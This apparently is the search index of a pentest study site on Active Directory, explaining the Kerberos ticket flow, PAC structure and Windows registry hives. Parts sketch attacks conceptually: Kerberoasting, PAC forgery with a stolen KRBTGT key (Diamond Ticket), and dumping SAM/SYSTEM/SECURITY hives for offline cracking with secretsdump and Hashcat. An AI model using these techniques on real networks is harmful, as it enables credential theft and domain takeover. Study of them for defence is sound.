DC stores: ❌ NOT the password ✅ Derived secrets (keys) from the password: RC4_Key = KDF_RC4(\"Winter@2024\") AES256_Key = KDF_AES256(\"Winter@2024\", salt) Same for service accounts: Service: MSSQL Account: sqlsvc Password: S3rvice!Pass DC stores: RC4_Key(sqlsvc) AES256_Key(sqlsvc) These are called long-term keys ."},{"id":"authentication-steps-main","u":"00_things-to-understand-prior.html#authentication-steps-main","sec":"Things To Understand Prior","lvl":3,"t":"Authentication Steps ( Main )","c":"image.png"},{"id":"step-by-step-kerberos-authentication","u":"00_things-to-understand-prior.html#step-by-step-kerberos-authentication","sec":"Things To Understand Prior","lvl":2,"t":"🔁 Step-by-Step Kerberos Authentication","c":"Let’s break Kerberos down into 6 simple steps that happen behind the scenes:"},{"id":"step-1-as-req-authentication-request","u":"00_things-to-understand-prior.html#step-1-as-req-authentication-request","sec":"Things To Understand Prior","lvl":3,"t":"✅ Step 1: AS-REQ — Authentication Request","c":"🧠 Goal : Get a Ticket Granting Ticket (TGT) Alice logs into her domain-joined Windows machine. Her machine sends an AS-REQ to the Domain Controller (KDC): Her username A timestamp encrypted with her password-derived key Realm and encryption details 📢 “Here’s who I am and proof that I know my password.”"},{"id":"step-2-as-rep-authentication-reply","u":"00_things-to-understand-prior.html#step-2-as-rep-authentication-reply","sec":"Things To Understand Prior","lvl":3,"t":"✅ Step 2: AS-REP — Authentication Reply","c":"🧠 Goal : Receive a TGT and session key The KDC verifies Alice’s identity and replies: A TGT (Ticket Granting Ticket) — encrypted with the KDC’s key A session key — encrypted using Alice’s key 📢 “Here’s your TGT and a session key to talk securely.”"},{"id":"step-3-tgs-req-requesting-service-access","u":"00_things-to-understand-prior.html#step-3-tgs-req-requesting-service-access","sec":"Things To Understand Prior","lvl":3,"t":"✅ Step 3: TGS-REQ — Requesting Service Access","c":"🧠 Goal : Access a specific service (e.g., file server) Alice wants to access a service like \\\\fileshare.corp.local . Her machine sends the TGT and a new authenticator to the TGS part of the KDC. It also includes the SPN of the service she wants. 📢 “Here’s my TGT. I’d like access to this service.”"},{"id":"step-4-tgs-rep-receiving-a-service-ticket","u":"00_things-to-understand-prior.html#step-4-tgs-rep-receiving-a-service-ticket","sec":"Things To Understand Prior","lvl":3,"t":"✅ Step 4: TGS-REP — Receiving a Service Ticket","c":"🧠 Goal : Get a service ticket to access the requested resource The KDC replies with: A Service Ticket (encrypted with the service’s key) A new session key (encrypted for Alice) 📢 “Here’s your access ticket for that service.”"},{"id":"step-5-ap-req-accessing-the-service","u":"00_things-to-understand-prior.html#step-5-ap-req-accessing-the-service","sec":"Things To Understand Prior","lvl":3,"t":"✅ Step 5: AP-REQ — Accessing the Service","c":"🧠 Goal : Use the service ticket to prove identity Alice’s system sends the service ticket and an authenticator to the target service. 📢 “Here’s my ticket and proof I’m really using it right now.”"},{"id":"step-6-authorization-with-pac","u":"00_things-to-understand-prior.html#step-6-authorization-with-pac","sec":"Things To Understand Prior","lvl":3,"t":"✅ Step 6: Authorization with PAC","c":"🧠 Goal : Service verifies permissions The service decrypts the ticket and reads Alice’s PAC (Privilege Attribute Certificate). It checks: Who she is What groups she’s in Whether she’s allowed access 📢 “Access granted. You have the required permissions.”"},{"id":"getting-tgt-indepth","u":"00_things-to-understand-prior.html#getting-tgt-indepth","sec":"Things To Understand Prior","lvl":3,"t":"Getting TGT ( InDepth )","c":""},{"id":"step-by-step-kerberos-login-user-gets-tgt-with-meaning","u":"00_things-to-understand-prior.html#step-by-step-kerberos-login-user-gets-tgt-with-meaning","sec":"Things To Understand Prior","lvl":3,"t":"Step-by-Step Kerberos Login (User Gets TGT) — With Meaning","c":"🎯 Goal: User wants to log in and get a TGT (Ticket Granting Ticket) so they don’t have to re-type the password for every service."},{"id":"step-1-user-types-username-password-client-side-only","u":"00_things-to-understand-prior.html#step-1-user-types-username-password-client-side-only","sec":"Things To Understand Prior","lvl":3,"t":"Step 1️⃣ User types username + password (Client-side only)","c":"Username: alice Password: Winter@2024 Client derives keys locally: UserKey = KDF(\"Winter@2024\") What this means (important conceptually): The password is never sent to the network. The derived key is never sent either. The key is just a cryptographic representation of the password . Both the client and the KDC can independently compute the same key because they both know the password-derived secret (the KDC from storage, the client from user input). Think of it like: The password becomes a cryptographic “lock key” used to open messages, but the lock itself is never transmitted."},{"id":"step-2-client-asks-kdc-for-tgt-as-req","u":"00_things-to-understand-prior.html#step-2-client-asks-kdc-for-tgt-as-req","sec":"Things To Understand Prior","lvl":3,"t":"Step 2️⃣ Client asks KDC for TGT (AS-REQ)","c":"Client → KDC: \"Hi KDC, I am alice\" What’s really happening: This is just an identity claim , not proof. The KDC doesn’t trust the client yet. At this point, anyone can say “I am alice.” The real proof comes in the next step when the client must decrypt something that only the real alice can decrypt."},{"id":"step-3-kdc-creates-a-tgt-for-alice","u":"00_things-to-understand-prior.html#step-3-kdc-creates-a-tgt-for-alice","sec":"Things To Understand Prior","lvl":3,"t":"Step 3️⃣ KDC creates a TGT for Alice","c":"KDC looks up alice in the DC database: Stored_UserKey = KDF(\"Winter@2024\") KDC creates the TGT: TGT = { username: alice, user_sid: S-1-5-21-..., groups: [Domain Users], session_key: random_key, expiry: 10 hours } Encrypted with KDC’s secret key . What this means: The TGT is basically Alice’s passport inside the domain . It proves: “This user was authenticated by the KDC.” The TGT is encrypted with the KDC’s own key so: Clients cannot read or modify it Only the KDC can validate it later This prevents: Ticket forgery Privilege tampering (no one can edit their group membership inside the ticket)"},{"id":"step-4-kdc-sends-tgt-session-key-encrypted-for-user-asrep","u":"00_things-to-understand-prior.html#step-4-kdc-sends-tgt-session-key-encrypted-for-user-asrep","sec":"Things To Understand Prior","lvl":3,"t":"Step 4️⃣ KDC sends TGT + session key encrypted for user (AS‑REP)","c":"Encrypted_For_User = Encrypt(UserKey, session_key) KDC → Client: - TGT (encrypted for KDC) - Encrypted session key (encrypted for alice) KDC encrypts the session key using Alice’s password‑derived key: Encrypted_For_User = Encrypt(UserLongTermKey, logon_session_key) KDC sends: KDC → Client: - Encrypted_TGT - Encrypted_For_User"},{"id":"meaning","u":"00_things-to-understand-prior.html#meaning","sec":"Things To Understand Prior","lvl":3,"t":"✅ Meaning","c":"This is the real authentication challenge : “If you are really Alice, you can decrypt this session key using your password‑derived key.” The KDC still never sees Alice’s password."},{"id":"step-5-client-decrypts-using-its-derived-key","u":"00_things-to-understand-prior.html#step-5-client-decrypts-using-its-derived-key","sec":"Things To Understand Prior","lvl":3,"t":"Step 5️⃣ Client decrypts using its derived key","c":"session_key = Decrypt(UserKey, Encrypted_For_User) ✔ If password correct → decrypt works ❌ If password wrong → decrypt fails What this proves: The client has proven knowledge of the password without sending it . This is how Kerberos avoids: Password transmission Replay attacks Network sniffing credential theft At this point: Alice is authenticated and holds a TGT, which she can reuse for hours without retyping her password."},{"id":"getting-tgs-indepth","u":"00_things-to-understand-prior.html#getting-tgs-indepth","sec":"Things To Understand Prior","lvl":3,"t":"Getting TGS ( InDepth )","c":""},{"id":"step-by-step-accessing-a-service-getting-tgs","u":"00_things-to-understand-prior.html#step-by-step-accessing-a-service-getting-tgs","sec":"Things To Understand Prior","lvl":3,"t":"Step-by-Step: Accessing a Service (Getting TGS)","c":"Now Alice wants to access SQL."},{"id":"step-6-client-asks-for-tgs-tgs-req","u":"00_things-to-understand-prior.html#step-6-client-asks-for-tgs-tgs-req","sec":"Things To Understand Prior","lvl":3,"t":"Step 6️⃣ Client asks for TGS (TGS-REQ)","c":"Client sends: TGT Authenticator (timestamp encrypted with session_key) SPN: MSSQL/sql01.domain.local What this means: The TGT proves Alice authenticated earlier. The Authenticator proves: This is Alice right now (not a replayed packet) The SPN tells the KDC: “I want a ticket for this specific service.” Session Key sent by KDC on step 4 ( AS-REP ) TGS_REQ = { TGT: <ticket_granting_ticket_from_step_4>, Authenticator: Encrypt(session_key, current_timestamp), SPN: \"MSSQL/sql01.domain.local\" } This prevents: Replay attacks Ticket reuse by attackers who captured old traffic"},{"id":"step-7-kdc-builds-the-service-ticket-tgs","u":"00_things-to-understand-prior.html#step-7-kdc-builds-the-service-ticket-tgs","sec":"Things To Understand Prior","lvl":3,"t":"Step 7️⃣ KDC builds the Service Ticket (TGS)","c":"TGS = { user: alice, groups: [Domain Users], session_key_user_service: random_key, expiry: 8 hours } Encrypted using service account key: Encrypted_TGS = Encrypt(ServiceAccountKey, TGS) What this means: The KDC is vouching for Alice to the service. The ticket is encrypted with the service’s password-derived key so: Only that service can open it This is how the service trusts the user: “If the KDC encrypted this for me, I trust the contents.” This is the exact design that enables Kerberoasting: Attackers steal this encrypted blob and try to crack the service account password offline."},{"id":"step-8-client-presents-tgs-to-service","u":"00_things-to-understand-prior.html#step-8-client-presents-tgs-to-service","sec":"Things To Understand Prior","lvl":3,"t":"Step 8️⃣ Client presents TGS to service","c":"Client → SQL: Here is my TGS Service decrypts: Decrypt(ServiceAccountKey, Encrypted_TGS) ✔ Works → user authenticated ❌ Fails → ticket is fake or corrupted What this means: The service never talks to the KDC directly. The service trusts the KDC because: Only the KDC could encrypt something using the service account’s secret The service now has: User identity Group memberships Session key to securely talk to the user This is mutual trust : KDC trusts the service. Service trusts the KDC. User trusts the KDC."},{"id":"how-kerberos-achieves-password-less-access-after-login","u":"00_things-to-understand-prior.html#how-kerberos-achieves-password-less-access-after-login","sec":"Things To Understand Prior","lvl":3,"t":"🔐 How Kerberos Achieves Password-less Access After Login","c":"The secret lies in a clever use of tickets . Here’s how it flows, step by step: Login (Initial Authentication) When you log in, your username and password are used once to request a special ticket called the TGT (Ticket Granting Ticket) from the Authentication Service (AS) — part of the KDC (Key Distribution Center) . ✅ Your password isn’t stored or reused — it’s used just to prove who you are. TGT Stored Securely This TGT is stored securely on your system and can be reused to request other tickets — it’s like your personal pass that proves your identity. Accessing a Service (e.g., File Server) When you try to access a service (like a file share or a web app), your system doesn’t ask you for your password again. Instead, it sends the TGT to the Ticket Granting Service (TGS) — also part of the KDC — and says: “Hey, I need a ticket to access this service. Here’s my TGT as proof I’m allowed.” Service Ticket Issued If the TGT is valid, the TGS issues a Service Ticket , which your computer then sends to the target service (e.g., a file server). You’re In! 🎉 The service reads the ticket, verifies it, and grants you access — no password prompt needed."},{"id":"pac-privilege-attribute-certificate","u":"00_things-to-understand-prior.html#pac-privilege-attribute-certificate","sec":"Things To Understand Prior","lvl":2,"t":"PAC (Privilege Attribute Certificate)","c":""},{"id":"understanding-pac","u":"00_things-to-understand-prior.html#understanding-pac","sec":"Things To Understand Prior","lvl":3,"t":"Understanding PAC","c":"Great fundamental question. Let me build this up from scratch."},{"id":"what-is-pac-simple-definition","u":"00_things-to-understand-prior.html#what-is-pac-simple-definition","sec":"Things To Understand Prior","lvl":3,"t":"What is PAC? (Simple Definition)","c":"PAC = A certificate inside a Kerberos ticket that tells services what permissions you have. Think of it like this: Your Kerberos Ticket = Your ID card ├─ Name: John Doe ├─ Department: Engineering │ AND ALSO INCLUDES: │ └─ PAC = A stamp from HR department saying: ├─ \"John Doe is in these groups\" ├─ \"John Doe has these permissions\" ├─ \"John Doe is allowed to do X, Y, Z\" └─ \"This was signed by an authorized person\" The service doesn’t have to go check with Active Directory every time you access it. It just reads the PAC in your ticket."},{"id":"historical-context-why-pac-was-created","u":"00_things-to-understand-prior.html#historical-context-why-pac-was-created","sec":"Things To Understand Prior","lvl":3,"t":"Historical Context: Why PAC Was Created","c":"Before PAC (Pre-Windows 2000) Client requests access to file share: Server (CIFS/SMB) ├─ Receives: Your Kerberos ticket ├─ Validates: \"Ticket signature is valid\" ├─ Thinks: \"User is authenticated, allow access\" └─ Problem: Server has NO IDEA what permissions you have! └─ Server must make separate call to AD: \"What groups is this user in?\" Issues: ├─ Extra network traffic ├─ Extra latency ├─ AD server load increases └─ Complexity: Every service needed AD query capability After PAC (Windows 2000+) Client requests access to file share: Server (CIFS/SMB) ├─ Receives: Your Kerberos ticket ├─ Extracts: PAC from ticket ├─ Reads: \"User is in Domain Admins, Domain Users\" ├─ Validates: \"PAC signature is correct\" ├─ Result: \"I know your permissions instantly, no AD call needed!\" Benefits: ├─ No extra AD queries needed ├─ Faster access decisions ├─ Services are offline-capable └─ Everything is self-contained in the ticket"},{"id":"pac-structure-whats-inside","u":"00_things-to-understand-prior.html#pac-structure-whats-inside","sec":"Things To Understand Prior","lvl":3,"t":"PAC Structure (What’s Inside)","c":"A PAC is a binary blob that lives inside your Kerberos ticket. It contains multiple buffers: PAC (inside your Kerberos ticket) │ ├─ Buffer 0: PAC_LOGON_INFO ◄─── THE MOST IMPORTANT │ │ │ ├─ User Identity │ │ ├─ User Name: \"jdoe\" │ │ ├─ User RID: 1106 (unique ID in domain) │ │ └─ Domain SID: S-1-5-21-DOMAIN-ID │ │ │ ├─ Group Memberships │ │ ├─ Primary Group RID: 513 (Domain Users) │ │ ├─ Group Count: 3 │ │ └─ Group RIDs/SIDs: │ │ ├─ S-1-5-21-DOMAIN-513 (Domain Users) │ │ ├─ S-1-5-21-DOMAIN-512 (Domain Admins) ← Would add this │ │ └─ S-1-5-21-DOMAIN-1234 (Engineers) │ │ │ ├─ User Flags │ │ ├─ Account disabled? │ │ ├─ Password expired? │ │ ├─ Account locked? │ │ └─ Home directory, profile path │ │ │ └─ Other user details │ ├─ Logon count │ ├─ Failed logon count │ ├─ Last interactive logon time │ ├─ Password last set │ └─ Account expiration time │ ├─ Buffer 1: PAC_CREDENTIAL_INFO │ ├─ User credentials (encrypted) │ ├─ Used for delegation │ └─ Encrypted with session key (can't read without ticket session key) │ ├─ Buffer 2: PAC_RESOURCE_GROUPS │ ├─ Domain-local groups from resource domains │ ├─ Used in multi-domain forests │ └─ Less important for single domain │ ├─ Buffer 3: PAC_DEVICE_INFO │ ├─ Device/computer information │ ├─ Added in Windows 10+ │ └─ For device-based access control │ ├─ Buffer 6: PAC_SERVER_CHECKSUM ◄─── CRITICAL SIGNATURE #1 │ ├─ Type: HMAC-SHA256 (or SHA1) │ ├─ Signed over: PAC_LOGON_INFO │ ├─ Key: KRBTGT master key │ ├─ Length: 32 bytes (SHA256) │ └─ Purpose: \"Prove logon info wasn't tampered\" │ └─ Buffer 7: PAC_PRIVSVR_CHECKSUM ◄─── CRITICAL SIGNATURE #2 ├─ Type: HMAC-SHA256 (or SHA1) ├─ Signed over: All OTHER buffers (except server checksum) ├─ Key: KRBTGT master key ├─ Length: 32 bytes (SHA256) └─ Purpose: \"Prove everything else wasn't tampered\""},{"id":"visual-where-pac-lives-in-the-ticket","u":"00_things-to-understand-prior.html#visual-where-pac-lives-in-the-ticket","sec":"Things To Understand Prior","lvl":3,"t":"Visual: Where PAC Lives in the Ticket","c":"┌──────────────────────────────────────────────────────────┐ │ KERBEROS TICKET (TGT or Service Ticket) │ ├──────────────────────────────────────────────────────────┤ │ │ │ Plaintext parts (not encrypted): │ │ ├─ Version number (5) │ │ ├─ Ticket type (krbtgt or service) │ │ ├─ Realm (DOMAIN.COM) │ │ └─ Server name │ │ │ ├──────────────────────────────────────────────────────────┤ │ │ │ Encrypted part (ENC_PART): │ │ │ │ │ ├─ flags (renewable, forwarded, etc.) │ │ ├─ session key (for this ticket) │ │ ├─ client name (your username) │ │ ├─ timestamps: │ │ │ ├─ auth_time (when you authenticated) │ │ │ ├─ start_time (ticket valid from) │ │ │ ├─ end_time (ticket expires) │ │ │ └─ renew_till (can renew until) │ │ │ │ │ └─ *** AUTHORIZATION DATA *** │ │ │ │ │ └─ [CONTAINS THE PAC] ◄────── This is what we care │ │ │ about for attacks │ │ ├─ PAC_LOGON_INFO │ │ ├─ PAC_CREDENTIAL_INFO │ │ ├─ PAC_SERVER_CHECKSUM │ │ └─ PAC_PRIVSVR_CHECKSUM │ │ │ └──────────────────────────────────────────────────────────┘"},{"id":"how-pac-is-used-in-real-authentication","u":"00_things-to-understand-prior.html#how-pac-is-used-in-real-authentication","sec":"Things To Understand Prior","lvl":3,"t":"How PAC is Used in Real Authentication","c":"Step 1: User Logs In (AS-REQ → AS-REP) Your computer: ├─ You enter username & password ├─ Sends: AS-REQ to DC │ DC (Domain Controller): ├─ Validates: \"Password is correct\" ├─ Creates: Kerberos ticket (TGT) ├─ Creates: PAC for your user │ └─ Queries AD: \"What groups is jdoe in?\" │ └─ Answer: \"Domain Users, Engineers, Sales\" ├─ Puts PAC inside TGT ├─ Encrypts: TGT with KRBTGT key ├─ Sends: Encrypted TGT back to you │ You now have: └─ TGT with your PAC inside (encrypted)"},{"id":"step-2-request-service-access-tgs-req-tgs-rep","u":"00_things-to-understand-prior.html#step-2-request-service-access-tgs-req-tgs-rep","sec":"Things To Understand Prior","lvl":3,"t":"Step 2: Request Service Access (TGS-REQ → TGS-REP)","c":"Your computer wants to access: \\\\fileserver\\documents You send: TGS-REQ ├─ \"Here's my TGT (encrypted)\" ├─ \"I want service ticket for CIFS/fileserver\" │ DC processes: ├─ Decrypts your TGT ├─ Extracts your PAC ├─ Reads: \"jdoe is in Domain Users, Engineers, Sales\" ├─ Creates: Service Ticket for CIFS ├─ COPIES: Your PAC into service ticket │ └─ (This is important! DC trusts your original PAC) ├─ Encrypts: Service ticket with service account key ├─ Sends: Service ticket back │ You now have: └─ Service Ticket with your PAC inside"},{"id":"step-3-access-resource-with-service-ticket","u":"00_things-to-understand-prior.html#step-3-access-resource-with-service-ticket","sec":"Things To Understand Prior","lvl":3,"t":"Step 3: Access Resource with Service Ticket","c":"File Server (fileserver.domain.com): │ You send: Service ticket + request for \\documents ├─ \"Here's my service ticket\" ├─ \"I want to read \\documents\" │ File Server: ├─ Decrypts: Service ticket (uses its own account key) ├─ Extracts: Your PAC from ticket ├─ Reads: \"This user is in Domain Users, Engineers, Sales\" ├─ Checks: Access Control List (ACL) on \\documents │ ├─ \"Domain Users: Read\" │ ├─ \"Engineers: Read+Modify\" │ ├─ \"Domain Admins: Full Control\" ├─ Validates: \"User is in Engineers, so allow Read+Modify\" ├─ Grants: Access with Engineer permissions │ Result: └─ You can read and modify documents Key point: The file server never calls AD . It just reads your PAC."},{"id":"pac-validation-the-critical-security-step","u":"00_things-to-understand-prior.html#pac-validation-the-critical-security-step","sec":"Things To Understand Prior","lvl":3,"t":"PAC Validation (The Critical Security Step)","c":"When a service receives your ticket, it does this: Service receives ticket with PAC: 1. DECRYPT ticket ├─ Key: Service account password (known locally) └─ Output: Plaintext ticket contents 2. EXTRACT PAC from ticket ├─ Find authorization_data section └─ Find PAC buffer 3. VALIDATE PAC_SERVER_CHECKSUM ├─ Calculate: HMAC-SHA256(KRBTGT_key, PAC_LOGON_INFO) ├─ Compare: Against PAC_SERVER_CHECKSUM value ├─ Result: \"Is this PAC authentic?\" │ ⚠️ PROBLEM: Service doesn't have KRBTGT key! ├─ So services send ticket back to DC └─ DC validates the checksum 4. SERVICE VALIDATES USER RIGHTS ├─ Reads: Groups from PAC (Domain Users, Engineers) ├─ Checks: ACLs on resource ├─ Grants: Access based on group memberships │ ✅ This is fast, no AD query needed!"},{"id":"why-pac-matters-for-diamond-ticket-attack","u":"00_things-to-understand-prior.html#why-pac-matters-for-diamond-ticket-attack","sec":"Things To Understand Prior","lvl":4,"t":"Why PAC Matters for Diamond Ticket Attack","c":"This is where it all connects: Normal TGT (from legitimate DC): │ ├─ Encrypted with: KRBTGT key ├─ Contains PAC showing: \"jdoe is in Domain Users\" ├─ PAC signed by: KRBTGT key │ When you modify it (Diamond Ticket): │ ├─ You decrypt with: KRBTGT key (you stole it!) ├─ You change PAC to: \"jdoe is in Domain Admins\" ├─ You re-sign with: KRBTGT key (you stole it!) ├─ You re-encrypt with: KRBTGT key (you stole it!) │ Result: │ ├─ Signature is valid ✓ (because you signed with correct key) ├─ Encryption is valid ✓ (because you encrypted with correct key) ├─ Services accept it ✓ (signatures check out) └─ You get admin access ✓ (PAC says you're admin)"},{"id":"pac-example-actual-data-structure","u":"00_things-to-understand-prior.html#pac-example-actual-data-structure","sec":"Things To Understand Prior","lvl":4,"t":"PAC Example (Actual Data Structure)","c":"If we dumped a real PAC with Rubeus, it would look like: PAC_LOGON_INFO: ├─ UserName: jdoe ├─ UserRid: 1106 ├─ PrimaryGroupId: 513 ├─ GroupCount: 2 ├─ GroupIds: │ ├─ 513 (Domain Users) ← Normal group │ └─ 512 (Domain Admins) ← Added by attacker! │ ├─ UserFlags: │ ├─ AccountDisabled: false │ ├─ PasswordExpired: false │ ├─ PasswordNotRequired: false │ ├─ LockoutTime: 0 │ └─ BadPasswordCount: 0 │ ├─ LogonTime: 2024-06-23 10:30:45 UTC ├─ LogoffTime: 2024-06-23 20:30:45 UTC ├─ KickoffTime: 2024-06-24 10:30:45 UTC │ └─ LogonServer: DC01 UserAccountControl: 0x00000210 └─ (Normal user, password not required for Kerberos) PAC_SERVER_CHECKSUM: ├─ ChecksumType: HmacSHA256 (23) └─ Checksum: A3F2E1D0... (32 bytes, HMAC-SHA256 digest) PAC_PRIVSVR_CHECKSUM: ├─ ChecksumType: HmacSHA256 (23) └─ Checksum: B4G3F2E1... (32 bytes, HMAC-SHA256 digest)"},{"id":"quick-comparison-pac-vs-no-pac","u":"00_things-to-understand-prior.html#quick-comparison-pac-vs-no-pac","sec":"Things To Understand Prior","lvl":3,"t":"Quick Comparison: PAC vs No PAC","c":"With PAC (Modern Windows) User logs in → Gets TGT with PAC ↓ User requests file access ↓ Service reads PAC from ticket ↓ Service checks: \"User is in this group\" ↓ Instant decision: Grant/Deny No AD query needed! ✓ Fast! ✓ Offline capable! ✓ Without PAC (Older systems or special cases) User logs in → Gets TGT without PAC ↓ User requests file access ↓ Service receives ticket ↓ Service doesn't know user's groups ↓ Service calls AD: \"What groups is jdoe in?\" ↓ AD responds ↓ Service checks ACLs ↓ Slow! ✗ Extra network traffic! ✗ AD must be online! ✗"},{"id":"pac-in-different-scenarios","u":"00_things-to-understand-prior.html#pac-in-different-scenarios","sec":"Things To Understand Prior","lvl":3,"t":"PAC in Different Scenarios","c":"Scenario 1: Normal User Access PAC shows: ├─ User: jdoe ├─ Groups: Domain Users, Engineers Result: ├─ Can access: Engineering shares ├─ Can't access: Finance shares ├─ Can't access: Admin shares Scenario 2: Service Account PAC shows: ├─ User: svc_sqldb ├─ Groups: Domain Users, SQL-Service-Accounts Result: ├─ Can access: Database servers (specific ACL) ├─ Can't access: User file shares ├─ Can't do domain admin operations Scenario 3: Domain Admin (Normal, Legitimate) PAC shows: ├─ User: admin_user ├─ Groups: Domain Users, Domain Admins, Enterprise Admins Result: ├─ Can access: Everything ├─ Can modify: Anything ├─ Can run: Privileged operations Scenario 4: Domain Admin (Forged Diamond Ticket) Original PAC shows: ├─ User: jdoe ├─ Groups: Domain Users ← Low privilege Attacker modifies PAC to show: ├─ User: jdoe ← Still jdoe! ├─ Groups: Domain Admins ← FORGED! Result: ├─ jdoe appears to be admin ├─ Can access: Admin shares ├─ But behavior anomaly: Low-priv user as admin └─ Detection: Why is jdoe accessing admin resources?"},{"id":"summary-what-is-pac","u":"00_things-to-understand-prior.html#summary-what-is-pac","sec":"Things To Understand Prior","lvl":3,"t":"Summary: What is PAC?","c":"PAC = Permission certificate in your ticket It contains: ├─ Your username ├─ Your user ID (RID) ├─ Your group memberships (SIDs) ├─ Your account flags └─ Cryptographic signatures proving DC created it Why it exists: ├─ Services don't need to call AD every time ├─ Tickets are self-contained ├─ Faster authorization decisions └─ Can work offline Why it's important for attacks: ├─ If you modify PAC → you change permissions ├─ But you need KRBTGT key to sign it ├─ Services validate signature (but trust KRBTGT) └─ This is the core of Diamond Ticket attack Security: ├─ Protected by: HMAC-SHA256 signatures ├─ Signed with: KRBTGT key ├─ Validated by: Services (implicitly trusting DC) └─ Compromised by: Anyone with KRBTGT key"},{"id":"sam-security-system","u":"00_things-to-understand-prior.html#sam-security-system","sec":"Things To Understand Prior","lvl":2,"t":"Sam Security & System","c":""},{"id":"overview","u":"00_things-to-understand-prior.html#overview","sec":"Things To Understand Prior","lvl":3,"t":"Overview","c":"The SAM database stores local user account hashes on Windows. Having access to SAM hashes enables offline password cracking , which means we don’t need to maintain an active session with the target while trying to crack passwords. To extract hashes, you need local admin access on the target machine. You will copy registry hive files related to SAM, transfer them to your attack machine, then dump the hashes using tools like Impacket’s secretsdump.py , and finally crack the hashes offline using Hashcat ."},{"id":"key-registry-hives-to-copy","u":"00_things-to-understand-prior.html#key-registry-hives-to-copy","sec":"Things To Understand Prior","lvl":3,"t":"Key Registry Hives to Copy","c":"Registry Hive | Description | — | — | hklm\\sam | Contains hashes of local user account passwords (NTLM/LM hashes). | hklm\\system | Contains the system bootkey required to decrypt the SAM database. | hklm\\security | Contains cached credentials for domain accounts (useful on domain-joined systems). | Technically, sam and system are necessary. security can be helpful if domain credentials are cached."},{"id":"what-are-registry-hives-in-windows","u":"00_things-to-understand-prior.html#what-are-registry-hives-in-windows","sec":"Things To Understand Prior","lvl":3,"t":"🗃️ What Are Registry Hives in Windows?","c":"Registry Hives are logical groupings of keys, subkeys, and values in the Windows Registry — a centralized database used to store configuration settings for the operating system, hardware, users, and applications. Each hive is a root of a section of the registry and is backed by a corresponding file on disk."},{"id":"common-registry-hives","u":"00_things-to-understand-prior.html#common-registry-hives","sec":"Things To Understand Prior","lvl":3,"t":"📂 Common Registry Hives","c":"Hive Name | Path in Registry Editor | File on Disk | Description | — | — | — | — | HKEY_LOCAL_MACHINE (HKLM) | HKLM | SYSTEM , SAM , SECURITY , etc. in C:\\Windows\\System32\\config\\ | System-wide settings | HKEY_USERS (HKU) | HKU | NTUSER.DAT per user | Stores user profile settings | HKEY_CURRENT_USER (HKCU) | HKCU | Loaded from HKEY_USERS\\<SID> | Settings for currently logged-in user | HKEY_CLASSES_ROOT (HKCR) | HKCR | Combines HKLM\\Software\\Classes and HKCU\\Software\\Classes | File associations and COM settings | HKEY_CURRENT_CONFIG (HKCC) | HKCC | Loaded at boot | Hardware profile of the current session |"},{"id":"internal-view-system-hives","u":"00_things-to-understand-prior.html#internal-view-system-hives","sec":"Things To Understand Prior","lvl":3,"t":"🧠 Internal View (System Hives)","c":"When performing credential attacks or forensic analysis, the most important hives are: SAM : Security Account Manager — stores local user accounts and password hashes. SECURITY : Stores LSA secrets like service passwords. SYSTEM : Contains system settings like boot info and control sets (used with SAM/SECURITY). SOFTWARE : Installed applications and configuration data. These are found in: C:\\Windows\\System32\\config\\"},{"id":"what-exactly-are-the-hives-where-they-are-stored","u":"00_things-to-understand-prior.html#what-exactly-are-the-hives-where-they-are-stored","sec":"Things To Understand Prior","lvl":3,"t":"🔥 1. WHAT EXACTLY ARE THE HIVES + WHERE THEY ARE STORED","c":"Windows stores local system configuration and secrets in file-based “hives” located at: C:\\Windows\\System32\\Config\\ Hive | File Path | Registry Mount Point | — | — | — | SYSTEM | C:\\Windows\\System32\\Config\\SYSTEM | HKLM\\SYSTEM | SAM | C:\\Windows\\System32\\Config\\SAM | HKLM\\SAM | SECURITY | C:\\Windows\\System32\\Config\\SECURITY | HKLM\\SECURITY | These hives are loaded into memory during boot."},{"id":"why-these-hives-exist-their-purpose","u":"00_things-to-understand-prior.html#why-these-hives-exist-their-purpose","sec":"Things To Understand Prior","lvl":3,"t":"⚙️ 2. WHY THESE HIVES EXIST (THEIR PURPOSE)","c":"Windows needs: a place to store local accounts → SAM a place to store encryption keys & system secrets → SECURITY a place to store system configuration + the BootKey → SYSTEM They are core components of Windows login and encryption mechanisms . If any one hive is missing → Windows cannot boot."},{"id":"system-hive-root-of-trust","u":"00_things-to-understand-prior.html#system-hive-root-of-trust","sec":"Things To Understand Prior","lvl":3,"t":"🔵 3. SYSTEM Hive (Root of Trust)","c":""},{"id":"system-hive-contains","u":"00_things-to-understand-prior.html#system-hive-contains","sec":"Things To Understand Prior","lvl":4,"t":"System hive contains:","c":"The BootKey (SysKey) : fundamental key used to decrypt SAM & SECURITY hives System-wide configuration ControlSets (device drivers, services, etc.)"},{"id":"registry-location","u":"00_things-to-understand-prior.html#registry-location","sec":"Things To Understand Prior","lvl":4,"t":"Registry Location:","c":"HKLM\\SYSTEM"},{"id":"bootkey-fragmentation-location","u":"00_things-to-understand-prior.html#bootkey-fragmentation-location","sec":"Things To Understand Prior","lvl":4,"t":"BootKey fragmentation location:","c":"HKLM\\SYSTEM\\ControlSet00X\\Control\\Lsa\\JD HKLM\\SYSTEM\\ControlSet00X\\Control\\Lsa\\Skew1 HKLM\\SYSTEM\\ControlSet00X\\Control\\Lsa\\GBG HKLM\\SYSTEM\\ControlSet00X\\Control\\Lsa\\Data Windows uses these 4 keys → concatenates → permutes → BootKey."},{"id":"why-stored-here","u":"00_things-to-understand-prior.html#why-stored-here","sec":"Things To Understand Prior","lvl":4,"t":"Why stored here?","c":"Because Windows needs a machine-level encryption root accessible at boot BEFORE authentication. SYSTEM hive = root crypto anchor ."},{"id":"sam-hive-local-account-database","u":"00_things-to-understand-prior.html#sam-hive-local-account-database","sec":"Things To Understand Prior","lvl":3,"t":"🔵 4. SAM Hive (Local Account Database)","c":"SAM hive contains: Local user records RIDs NTLM hashes (encrypted) Password history Account metadata Registry location: HKLM\\SAM File location: C:\\Windows\\System32\\Config\\SAM Why stored here? SAM = Windows needed a local user database before Active Directory even existed. It is still required for: Local Administrator Local users on standalone machines Laptop local account logins (even domain-joined laptops have local accounts) Services running under local accounts (LocalService, NetworkService) Recovery console / Safe Mode logins SAM is ALWAYS present. The OS cannot function without it."},{"id":"security-hive-lsa-secret-storage","u":"00_things-to-understand-prior.html#security-hive-lsa-secret-storage","sec":"Things To Understand Prior","lvl":3,"t":"🔵 5. SECURITY Hive (LSA Secret Storage)","c":"Contains: LSA secrets (service account passwords, cached domain creds, DPAPI system keys, etc.) Secret encryption key (“LSA Key”) Policy information Registry location: HKLM\\SECURITY File: C:\\Windows\\System32\\Config\\SECURITY Why stored here? Because the 